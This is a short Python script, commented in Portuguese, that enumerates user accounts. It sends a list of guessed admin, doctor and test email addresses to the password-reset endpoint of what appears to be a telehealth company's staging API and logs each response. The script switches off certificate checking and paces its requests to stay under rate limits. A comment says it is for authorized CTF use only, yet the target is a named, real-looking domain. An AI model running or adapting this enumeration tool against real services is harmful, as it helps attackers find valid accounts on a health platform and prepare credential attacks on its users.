#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
from requests.exceptions import RequestException

# AVISO: use somente com autorização (CTF/ambiente controlado).
# Endpoint e emails podem ser ajustados abaixo.

URL = "https://api.homolodoc.com.br/Account/forgetPassword"
TIMEOUT = 10  # segundos
SLEEP_BETWEEN = 0.5  # evita rate limit

# Desabilita warnings de verificação SSL quando verify=False
try:
    from urllib3.exceptions import InsecureRequestWarning
    import urllib3
    urllib3.disable_warnings(InsecureRequestWarning)
except Exception:
    pass

emails = [
    "admin@teladoc.com",
    "admin@homolodoc.com.br",
    "medico@teladoc.com",
    "teste@teladoc.com",
    "medico_pentest@teladoc.com",
]

def short_body(text: str, limit: int = 150) -> str:
    t = (text or "").replace("\n", " ").strip()
    return t[:limit] + ("…" if len(t) > limit else "")

session = requests.Session()
session.headers.update({
    "User-Agent": "CTF-Enumerator/1.0",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
})

for email in emails:
    payload = {"email": email}
    try:
        resp = session.post(URL, json=payload, timeout=TIMEOUT, verify=False)
        body_preview = ""

        # Tenta extrair mensagem útil
        try:
            data = resp.json()
            # tenta campos comuns
            msg = data.get("message") or data.get("detail") or data.get("error") or data
            body_preview = short_body(json.dumps(msg, ensure_ascii=False))
        except ValueError:
            body_preview = short_body(resp.text)

        print(f"{email}: {resp.status_code} - {body_preview}")

        # Se o servidor sinalizar rate limit, aguarde um pouco mais
        if resp.status_code in (429,):
            time.sleep(2)

    except RequestException as e:
        print(f"{email}: ERROR - {e}")

    time.sleep(SLEEP_BETWEEN)
